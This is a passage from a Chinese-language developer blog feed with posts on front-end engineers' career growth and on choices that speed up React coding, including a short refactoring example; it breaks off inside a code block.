8，像是:</p><table><thead><tr><th>時間</th><th>完成事項</th><th>參與角色</th><th>特質態度</th><th>得分</th></tr></thead><tbody><tr><td>2015 - 2017</td><td>網站開發基礎知識與技能培養</td><td>開發者</td><td>學習並決定發展領域</td><td>3</td></tr><tr><td>2018 Q1-Q2</td><td>導入 Trello 專案管理，使專案進度透明，降低溝通成本</td><td>介紹以及協助導入</td><td>教學、分享新知</td><td>5</td></tr><tr><td>2018 Q3-Q4</td><td>系統原型開發以及環境建置</td><td>開發者</td><td>決定架構及開發</td><td>5</td></tr><tr><td>2019 Q1-Q3</td><td>將地端系統上到 AWS 以及持續開發其他內部系統</td><td>開發者</td><td>擴大專案範圍</td><td>8</td></tr><tr><td>2020 Q1-Q2</td><td>加入新團隊並在短期內開發系統原型，共同討論合作方式增加產出</td><td>開發者</td><td>增加影響力</td><td>8</td></tr><tr><td>2020 Q3-Q4</td><td>同事離職，協助交接系統並穩定上線</td><td>開發者</td><td>逆轉形勢</td><td>5</td></tr><tr><td>2021 Q1-Q2</td><td>將專案自動化測試完善，開始舉辦內部讀書會</td><td>介紹以及協助導入</td><td>教學、分享新知</td><td>8</td></tr><tr><td>2021 Q3-Q4</td><td>PM 和資深同事離職重新適應新同事，疫情影響工作樣貌</td><td>開發者</td><td>接受變化</td><td>3</td></tr><tr><td>2022 Q1</td><td>決定轉職和協助帶領新人</td><td>Mentor</td><td>教育下一代</td><td>5</td></tr><tr><td>2022 Q2-Q4</td><td>交女朋友</td><td>男朋友</td><td>探索未知領域</td><td>8</td></tr><tr><td>2022 Q4</td><td>第一次做 3D 相關專案，拿到了一個獎金不多的部門獎項</td><td>開發者</td><td>探索未知領域</td><td>5</td></tr></tbody></table><h2 id="技術選型"><a href="#技術選型" class="headerlink" title="技術選型"></a>技術選型</h2><p>運氣蠻好的，小編轉職前端工程師後的這 5-6 年都踩在對的必修點上，分享一下我在選型上的考量</p><ol><li>github trend 可以定時去看</li><li>訂閱相關電子報，像是 react status</li><li>跟著函式庫或框架的官方建議走</li><li>能不能減少 code，從架構上來降低維護的複雜度</li><li>Github 上更新的速度以及更新的註解夠不夠</li><li>前端社團偶而關注常在 medium 上發文的大大</li><li>看高薪的職缺在官網或是 104 上需要什麼技能</li><li>就算不想換工作也要去厲害的公司面試看看</li><li>新的一年就用年度當關鍵字搜尋就會看到下圖</li></ol><blockquote><p><img src="https://github.com/adam-golab/react-developer-roadmap/raw/master/roadmap.png" alt="roadmap"><br>圖片來源: <a href="https://github.com/adam-golab/react-developer-roadmap">https://github.com/adam-golab/react-developer-roadmap</a></p></blockquote><h2 id="成長型心態"><a href="#成長型心態" class="headerlink" title="成長型心態"></a>成長型心態</h2><p>如同前面所提，舊教育體制無法培訓出適合的人才，所以大多需要個人的學習跟成長心態。</p><p>當心態正確了也就會在各方面成長，畢竟很少人可以做到不一致的生活，不一致指的是想的、做的、說的、認同的可以切分。</p><p>什麼是成長型心態? 在個人心態上該有的是主動積極、以終為始的概念。</p><ul><li>主動積極<ul><li>自覺，知道能力後要去努力</li><li>良知，公司綁的住人綁不住心跟生產力</li></ul></li><li>以終為始<ul><li>要有想像力，想像未來可能成為的樣子</li><li>獨立意志，並非社會說什麼好就好，天下皆知美之爲美，斯惡已</li></ul></li></ul><p>以終為始談的是達成目的這件事，實際上也可以分成心智上跟實際上兩階段</p><ul><li>心智上的創造: 在心中勾勒出目的，思考清楚自己的角色，去定位自己成為什麼樣的人</li><li>實際上的創造: 在外在環境上，要學會去評估重要的事情，養成好的習慣</li></ul><h3 id="個人成長"><a href="#個人成長" class="headerlink" title="個人成長"></a>個人成長</h3><ul><li>一次做一件事，就像工作上不能同時有兩個主管，要找到當下最重要的小事</li><li>雙贏思維，其實沒有必要犧牲什麼，可以悠哉工作也可以成長薪水</li><li>習慣養成，行為一再重複就會變成習慣，卓越會是一種習慣</li></ul><h3 id="職涯成長"><a href="#職涯成長" class="headerlink" title="職涯成長"></a>職涯成長</h3><p>如果是想要成長，就要讓努力被看見。</p><ul><li>職涯是你的不是老闆的，怎麼發展大多只能靠自己</li><li>履歷要寫就直接公開然後去打搜尋排行榜，請大家協助轉發</li><li>觀察表現好的同事都怎麼表達，要懂得包裝和表達自己做的事情</li><li>給周邊的人適當的期待</li></ul><p>要怎麼讓老闆提攜你而不是提攜其他人?</p><blockquote><p>反過來想就是老闆為什麼要提攜你，首先要告訴老闆，你想要被提攜！</p></blockquote><ul><li>你能做什麼?</li><li>你想做什麼?</li><li>你想得到什麼?</li><li>誰會就帶誰來開會</li></ul><h2 id="環境的影響"><a href="#環境的影響" class="headerlink" title="環境的影響"></a>環境的影響</h2><p>小編在出社會後也待過幾間公司，同事、主管、專案狀態絕對是會直接影響軟體工程師的發展。</p><blockquote><p>一個重點，現在的主管就是這份工作的職場天花板。</p></blockquote><p>在學習的過程中最容易做到的就是<strong>重複對方做得好的部分</strong>。</p><ul><li>同儕的價值則會顯示在日常教學相長、交友圈。</li><li>看見老闆到這個位置的原因，也許老闆只是幸運，幸運會是一個成分，但如果沒有能力，並不會走到這個位置。</li></ul><p>如果主管只是第一階的主管?</p><ul><li>可以把他當職涯上的顧問</li><li>戰場很大可以不用把目標放在這間公司</li></ul><h2 id="讓他人成長"><a href="#讓他人成長" class="headerlink" title="讓他人成長"></a>讓他人成長</h2><p>當成為資深一些的職場人後，也會需要練習讓他人成長，比起偷懶直接給予答案，比較好的方式也許是評估是否有那個心力去引導。</p><ul><li>訓練的過程要容忍另外一個人可以做的沒有那麼好</li></ul><p>常見的問題可能如下</p><ul><li>現在做好了哪些？查到了什麼相關資訊？</li><li>過去碰上類似這樣的問題時，是如何解決的？</li><li>知道自己必須做什麼嗎？在這種情況下，什麼可以拿來當解決方案？</li></ul><h3 id="給予他人回饋"><a href="#給予他人回饋" class="headerlink" title="給予他人回饋"></a>給予他人回饋</h3><p>在還沒放棄對方之前，可以觀察一些現象並且提醒。</p><ol><li>確認錯誤分類</li><li>理解發生錯誤的原因</li><li>有效的溝通與避免</li></ol><p>對於錯誤來說可以分成有價值、沒價值的兩類</p><ul><li>無法帶來學習成長的低級錯誤<ul><li>寫錯字</li><li>重複問一樣的問題</li><li>做過的事情無法學會</li></ul></li><li>有價值的錯誤<ul><li>能依據反應修正行為</li><li>犯錯後能夠增進判斷能力</li><li>成長來自更好的做法</li></ul></li></ul><h3 id="理解工作失誤"><a href="#理解工作失誤" class="headerlink" title="理解工作失誤"></a>理解工作失誤</h3><p>職場上會被教學是教的人自己來或給其他人來都比教你還累才會選擇教你。</p><p>訊息講了，但傳遞效用遞減，聽的人只聽部分外加自行轉化。</p><ul><li>找出顯性、隱性的原因</li><li>從結構或流程去了解不斷犯錯的原因</li></ul><p>工作上的顯性失誤</p><ul><li>知識不足: 透過文件、Google 的能力協助</li><li>技巧不足: 練習、睡飽</li><li>規則不理解: 透過 SOP 並且確實遵守</li></ul><p>隱性錯誤來自於無知，不知道問題在哪? 不知道該怎麼重現問題?</p><p>如果要找一個討論問題的人，必須先準備好問題、必須先碰到過問題，也代表在這之前就必須有能力動手重現。</p><ul><li>不知道自己原來不擅長</li><li>不知道做事情的原因與目的</li><li>犯錯後沒有紀錄和改善</li><li>確認的系統和檢核的機制可能有點問題</li></ul><p>最後來小小結語一下，對工程師來說重要的事情是要練習</p><ol><li>解決問題</li><li>把解決不了的問題交代清楚給有能力的人解決</li></ol><p>在流程上請減少浪費工程師的時間，工程師就能夠做更多的事情，常做的事情就流程化、標準化，逐步的自動化。</p><p>資深工程師並不會是小叮噹，只是工作比較久踩過的雷比較多所以直覺比較準，不一定比較厲害，但永遠都會是大雄遇到問題時能一起陪伴的好朋友。</p><blockquote class="instagram-media" data-instgrm-captioned data-instgrm-permalink="https://www.instagram.com/p/Cits7VqNE2K/?utm_source=ig_embed&amp;utm_campaign=loading" data-instgrm-version="14" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:540px; min-width:326px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:16px;"> <a href="https://www.instagram.com/p/Cits7VqNE2K/?utm_source=ig_embed&amp;utm_campaign=loading" style=" background:#FFFFFF; line-height:0; padding:0 0; text-align:center; text-decoration:none; width:100%;" target="_blank"> <div style=" display: flex; flex-direction: row; align-items: center;"> <div style="background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 40px; margin-right: 14px; width: 40px;"></div> <div style="display: flex; flex-direction: column; flex-grow: 1; justify-content: center;"> <div style=" background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 100px;"></div> <div style=" background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 60px;"></div></div></div><div style="padding: 19% 0;"></div> <div style="display:block; height:50px; margin:0 auto 12px; width:50px;"><svg width="50px" height="50px" viewBox="0 0 60 60" version="1.1" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g transform="translate(-511.000000, -20.000000)" fill="#000000"><g><path d="M556.869,30.41 C554.814,30.41 553.148,32.076 553.148,34.131 C553.148,36.186 554.814,37.852 556.869,37.852 C558.924,37.852 560.59,36.186 560.59,34.131 C560.59,32.076 558.924,30.41 556.869,30.41 M541,60.657 C535.114,60.657 530.342,55.887 530.342,50 C530.342,44.114 535.114,39.342 541,39.342 C546.887,39.342 551.658,44.114 551.658,50 C551.658,55.887 546.887,60.657 541,60.657 M541,33.886 C532.1,33.886 524.886,41.1 524.886,50 C524.886,58.899 532.1,66.113 541,66.113 C549.9,66.113 557.115,58.899 557.115,50 C557.115,41.1 549.9,33.886 541,33.886 M565.378,62.101 C565.244,65.022 564.756,66.606 564.346,67.663 C563.803,69.06 563.154,70.057 562.106,71.106 C561.058,72.155 560.06,72.803 558.662,73.347 C557.607,73.757 556.021,74.244 553.102,74.378 C549.944,74.521 548.997,74.552 541,74.552 C533.003,74.552 532.056,74.521 528.898,74.378 C525.979,74.244 524.393,73.757 523.338,73.347 C521.94,72.803 520.942,72.155 519.894,71.106 C518.846,70.057 518.197,69.06 517.654,67.663 C517.244,66.606 516.755,65.022 516.623,62.101 C516.479,58.943 516.448,57.996 516.448,50 C516.448,42.003 516.479,41.056 516.623,37.899 C516.755,34.978 517.244,33.391 517.654,32.338 C518.197,30.938 518.846,29.942 519.894,28.894 C520.942,27.846 521.94,27.196 523.338,26.654 C524.393,26.244 525.979,25.756 528.898,25.623 C532.057,25.479 533.004,25.448 541,25.448 C548.997,25.448 549.943,25.479 553.102,25.623 C556.021,25.756 557.607,26.244 558.662,26.654 C560.06,27.196 561.058,27.846 562.106,28.894 C563.154,29.942 563.803,30.938 564.346,32.338 C564.756,33.391 565.244,34.978 565.378,37.899 C565.522,41.056 565.552,42.003 565.552,50 C565.552,57.996 565.522,58.943 565.378,62.101 M570.82,37.631 C570.674,34.438 570.167,32.258 569.425,30.349 C568.659,28.377 567.633,26.702 565.965,25.035 C564.297,23.368 562.623,22.342 560.652,21.575 C558.743,20.834 556.562,20.326 553.369,20.18 C550.169,20.033 549.148,20 541,20 C532.853,20 531.831,20.033 528.631,20.18 C525.438,20.326 523.257,20.834 521.349,21.575 C519.376,22.342 517.703,23.368 516.035,25.035 C514.368,26.702 513.342,28.377 512.574,30.349 C511.834,32.258 511.326,34.438 511.181,37.631 C511.035,40.831 511,41.851 511,50 C511,58.147 511.035,59.17 511.181,62.369 C511.326,65.562 511.834,67.743 512.574,69.651 C513.342,71.625 514.368,73.296 516.035,74.965 C517.703,76.634 519.376,77.658 521.349,78.425 C523.257,79.167 525.438,79.673 528.631,79.82 C531.831,79.965 532.853,80.001 541,80.001 C549.148,80.001 550.169,79.965 553.369,79.82 C556.562,79.673 558.743,79.167 560.652,78.425 C562.623,77.658 564.297,76.634 565.965,74.965 C567.633,73.296 568.659,71.625 569.425,69.651 C570.167,67.743 570.674,65.562 570.82,62.369 C570.966,59.17 571,58.147 571,50 C571,41.851 570.966,40.831 570.82,37.631"></path></g></g></g></svg></div><div style="padding-top: 8px;"> <div style=" color:#3897f0; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:550; line-height:18px;">View this post on Instagram</div></div><div style="padding: 12.5% 0;"></div> <div style="display: flex; flex-direction: row; margin-bottom: 14px; align-items: center;"><div> <div style="background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(0px) translateY(7px);"></div> <div style="background-color: #F4F4F4; height: 12.5px; transform: rotate(-45deg) translateX(3px) translateY(1px); width: 12.5px; flex-grow: 0; margin-right: 14px; margin-left: 2px;"></div> <div style="background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(9px) translateY(-18px);"></div></div><div style="margin-left: 8px;"> <div style=" background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 20px; width: 20px;"></div> <div style=" width: 0; height: 0; border-top: 2px solid transparent; border-left: 6px solid #f4f4f4; border-bottom: 2px solid transparent; transform: translateX(16px) translateY(-4px) rotate(30deg)"></div></div><div style="margin-left: auto;"> <div style=" width: 0px; border-top: 8px solid #F4F4F4; border-right: 8px solid transparent; transform: translateY(16px);"></div> <div style=" background-color: #F4F4F4; flex-grow: 0; height: 12px; width: 16px; transform: translateY(-4px);"></div> <div style=" width: 0; height: 0; border-top: 8px solid #F4F4F4; border-left: 8px solid transparent; transform: translateY(-4px) translateX(8px);"></div></div></div> <div style="display: flex; flex-direction: column; flex-grow: 1; justify-content: center; margin-bottom: 24px;"> <div style=" background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 224px;"></div> <div style=" background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 144px;"></div></div></a><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/Cits7VqNE2K/?utm_source=ig_embed&amp;utm_campaign=loading" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by yyds_梗圖迷因 (@yyds_chicowba)</a></p></div></blockquote> <script async src="//www.instagram.com/embed.js"></script>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 職場老鳥必點技能 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>選擇，會加速你的開發嗎?</title>
      <link href="/2023/10/13/simplify-your-life/how-to-speed-up-coding/"/>
      <url>/2023/10/13/simplify-your-life/how-to-speed-up-coding/</url>
      
        <content type="html"><![CDATA[<p>小編在前陣子參加了 AWS 社群日，體驗了怎麼用英雄聯盟的資料來做模型的訓練和機器學習，並透過模型來為遊戲結果提供預測或建議。</p><p>對於 Python 菜鳥如我竟然可以在短短幾分鐘內使用 Jupyter Notebook 來探索和分析真實英雄聯盟對戰數據，當下覺得非常驚訝。</p><p>在這樣短暫的體驗下 AI 在過程中給了不少協助，舉個正在頻繁發生的例子來說，在 GPT 在跟 Chat 一起出現之後</p><ul><li>Copilot 的出現也讓小編的同事在撰寫單元測試省下很多時間</li><li>給圖片能夠產生出程式碼的 Figma</li><li>聊天機器人帶來的新零售和電子商務</li><li>生成式藝術</li></ul><p>接下來的下個時代，快速跟著世代變化做選擇似乎變得越來越需要。</p><p>在軟體工程領域，我們經常需要決定學習哪些新技術、參與哪些專案以及投入多少時間和精力，這些選擇將直接影響我們的職業生涯和生活。</p><p>這幾年的生活和工作發展下來，體驗到的是</p><blockquote><p>工作和生活就是我們過去所做過的選擇的總和</p></blockquote><p>當你重回當初的模樣，回頭過來看看曾經瘋狂、荒謬、驚奇、平靜、難忘的生活，最難遺忘的會是什麼。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/GuqY5OViunk?si=2w3f2Il9QvdtKhqQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><h2 id="工作的選擇"><a href="#工作的選擇" class="headerlink" title="工作的選擇"></a>工作的選擇</h2><p>想來談談工作的選擇，資本主義社會給了我們穩定的金錢和標籤，而透過金錢和標籤請我們進行角色扮演。</p><p>在角色扮演的過程中，各種決定和取捨總會需要評估，其中只存在一個問題，那就是工作對你而言是什麼？選擇工作對人生價值有何意義？</p><p>在工作的選擇上可以粗分成三大類</p><ul><li>核心工作: 最重要、最有價值的任務和職責<ul><li>開發核心產品功能</li><li>解決關鍵技術問題</li><li>提供高品質程式碼</li><li>協作和溝通</li></ul></li><li>專案工作<ul><li>短期專案</li><li>臨時任務</li><li>緊急修復</li><li>日常例行性項目</li></ul></li><li>發展性工作<ul><li>持續學習和專業發展</li></ul></li></ul><p>這三類大致構成了工作的樣貌，而金錢本身讓你為了這些犧牲了什麼？交換了什麼？舉個例子來說，最害人不淺的一句話大概就是你的工作很穩，快去買棟房子吧！這句話背後的交換隱含了些什麼？</p><p>買了房子之後，公司和老闆給了足夠的金錢，兌換未來 30 年不間斷的專案工作，這會是你想要的人生嗎？生活選擇該是一道道單選題，或是該持續反思後才選擇往前進？</p><h2 id="環境的選擇"><a href="#環境的選擇" class="headerlink" title="環境的選擇"></a>環境的選擇</h2><p>人際關係和工作環境也可能會是有毒的，生活中其實最該選擇和斷捨離的會是人際關係，小時候常常聽到人脈，但其實多認識一個人其實不會真的多什麼資產。</p><ul><li>融入群體有必要嗎? 如果那個群體有毒，那不就會慢性中毒?</li><li>為什麼無法過著自己想要的生活，跟大家一樣到底有什麼好?</li><li>團隊對我的工作必要嗎? 團隊能幫助我接近理想生活嗎?</li></ul><p>充滿著追求更多，最終會不會就過著被被垃圾資訊、物質淹沒的生活。</p><p>底下是小編請 Chat GPT 列出的一些警訊</p><ul><li>不正常的壓力和負面情感</li><li>控制和操控</li><li>不健康的競爭</li><li>缺乏支持和合作</li><li>缺乏職涯發展</li><li>不透明和不公平</li><li>虛偽和欺騙</li><li>工作生活無法平衡</li></ul><h2 id="工具的選擇"><a href="#工具的選擇" class="headerlink" title="工具的選擇"></a>工具的選擇</h2><p>工具的選擇來提兩種最可以直接有感增加開發者體驗的工具</p><ul><li><a href="https://linyencheng.github.io/2022/09/26/relationships-between-frontend-and-backend/tool-vscode-extensions-with-eslint-and-prettier/">自動化和程式碼品質檢查工具</a><ul><li>ESlint、SonarLint: 自動檢查程式碼，並且建議最佳實踐</li><li>commit lint: 自動檢查 commit 的 message</li><li>Prettier: 確保一致的風格</li></ul></li><li><a href="https://linyencheng.github.io/2022/10/10/relationships-between-frontend-and-backend/devops-ci-cd-jenkins-circleci-and-github-action/">持續整合和持續交付（CI&#x2F;CD）工具</a>，以實現自動化的測試、部署和整合，這些工具可幫助減少人工造成的風險並把開發流程自動化<ul><li>Jenkins: 老牌好用的 GUI 工具但其實也支援用程式碼進行設定</li><li>Travis CI、Circle CI: 第三方的老牌服務，透過 YAML 來設定</li><li><a href="https://linyencheng.github.io/2022/05/30/devops-gitlab-ci-and-gitlab-runner/">GitLab CI</a>、GitHub Actions、Azure DevOps: 版控工具原生內建的工具，算是近期推出的全家餐解決方案</li></ul></li></ul><h2 id="程式撰寫的選擇"><a href="#程式撰寫的選擇" class="headerlink" title="程式撰寫的選擇"></a>程式撰寫的選擇</h2><p>以程式碼撰寫來說，主要會有三種加速的目標</p><ol><li>更少的打字時間</li><li>更少的除錯與測試時間</li><li>更少的閱讀時間</li></ol><p>接下來的內容主要來翻譯 <a href="https://javascript.plainenglish.io/double-your-react-coding-speed-with-this-simple-trick-ca2e47d1bf97"><code>Double your react coding speed with this simple trick</code></a> 這篇文章，會從剛剛提到的三個角度來切入 React 開發效率。</p><h3 id="更少的打字時間"><a href="#更少的打字時間" class="headerlink" title="更少的打字時間"></a>更少的打字時間</h3><p>要讓打字時間縮短，大致上分為兩個方向:</p><ol><li><p>DRY 增加共用的程式碼: 大元件拆分成小且可重用的 hooks 或元件</p><ul><li>資料處理邏輯獨立</li><li>元件只處理顯示</li><li>簡化輸入參數 (props)</li></ul></li><li><p>善用工具</p><ul><li>Snippets: 編輯器外掛協助自動完成</li><li>Auto Import: 編輯器外掛協助路徑輸入</li><li>prettier: 編輯器自動格式化</li></ul></li></ol><h3 id="更少的除錯與測試時間"><a href="#更少的除錯與測試時間" class="headerlink" title="更少的除錯與測試時間"></a>更少的除錯與測試時間</h3><p>通常找到錯誤的流程要先把 App 用開發模式跑起來後，操作元件重現錯誤並查看相關錯誤訊息，修復後重試。在開發階段如果要避免低階錯誤，可分成兩個方向</p><ol><li>撰寫測試並導入 CI&#x2F;CD，在流程中就靠機器提早幫我們發現問題</li><li>善用工具，在開發階段透過 eslint、props type check、TypeScript 來避免低階問題</li></ol><h3 id="更少的閱讀時間"><a href="#更少的閱讀時間" class="headerlink" title="更少的閱讀時間"></a>更少的閱讀時間</h3><p>開發者最常花時間在看懂程式碼而非撰寫，通常好的程式都有容易被修改、容易發現問題的優點，那在撰寫上列出幾個我覺得需要改掉的壞習慣:</p><ul><li>程式碼太多暗號</li><li>類似功能卻散在各處</li><li>太長的函式，需要花時間才能了解</li><li>使用上需要滿滿的參數卻又未分類</li><li>太多布林值狀態</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 程式碼太多暗號</span></span><br><span class="line">value[<span class="number">0</span>][index] = sum;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 滿滿的參數卻又未分類</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Grid</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">data</span>=<span class="string">&#123;gridData&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">pagination</span>=<span class="string">&#123;false&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">autoSize</span>=<span class="string">&#123;true&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">enableSort</span>=<span class="string">&#123;true&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">sortOrder</span>=<span class="string">&quot;desc&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">disableSelection</span>=<span class="string">&#123;true&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">infiniteScroll</span>=<span class="string">&#123;true&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">...</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">/&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  <span class="attr">pagination</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">autoSize</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">enableSort</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">sortOrder</span>: <span class="string">&#x27;desc&#x27;</span>,</span><br><span class="line">  <span class="attr">disableSelection</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">infiniteScroll</span>: <span class="literal">true</span>,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="title class_">Grid</span></span><br><span class="line">  data=&#123;gridData&#125;</span><br><span class="line">  options=&#123;options&#125;</span><br><span class="line">/&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 太多布林值狀態</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [isLoading, setIsLoading] = <span class="title function_">useState</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="keyword">const</span> [isFinished, setIsFinished] = <span class="title function_">useState</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="keyword">const</span> [hasError, setHasError] = <span class="title function_">useState</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fetchSomething</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="title function_">setIsLoading</span>(<span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">  <span class="title function_">fetch</span>(url)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">setIsLoading</span>(<span class="literal">false</span>)</span><br><span class="line">      <span class="title function_">setIsFinished</span>(<span class="literal">true</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">setHasError</span>(<span class="literal">true</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [state, setState] = <span class="title function_">useState</span>(<span class="string">&#x27;idle&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fetchSomething</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="title function_">setState</span>(<span class="string">&#x27;loading&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="title function_">fetch</span>(url)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">setState</span>(<span class="string">&#x27;finished&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">setState</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="重構元件範例"><a href="#重構元件範例" class="headerlink" title="重構元件範例"></a>重構元件範例</h3><p>元件優化的方向與過程，最主要還是拆解成可重複使用的小單位，像是運用 render props 或是 HOC 甚至是寫成 Custom hook，對岸維護的 <a href="https://ahooks.js.org/">ahook</a> 功能就非常多樣。常見可以優化的部分我覺得分以下三個部分:</p><ol><li>打 API 的寫法<ul><li>初階: 在元件裡面抓資料</li><li>進階: 透過 redux 這類工具統一資料處理邏輯</li><li>進階: 寫一個 hook 或是使用 react-query</li></ul></li><li>錯誤處理<ul><li>初階: 直接在打 API 的 function 中寫判斷</li><li>進階: ErrorBoundary 處理或是 axios interceptor</li></ul></li><li>樣式檔的優化<ul><li>初階: CSS</li><li>進階: Sass or SCSS</li><li>進階: CSS-in-JS</li><li>進階: Atomic-css</li></ul></li></ol><p>最開始的元件撰寫通常會長成下面這樣，在同樣一個元件裡面放了狀態，打 API 抓資料的相關程式，還有顯示的部分，好處當然就是直觀也不會說不好維護，但當這樣的元件有 50 個的時候，打 API 的方式要修改時，也許就會懷疑人生?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 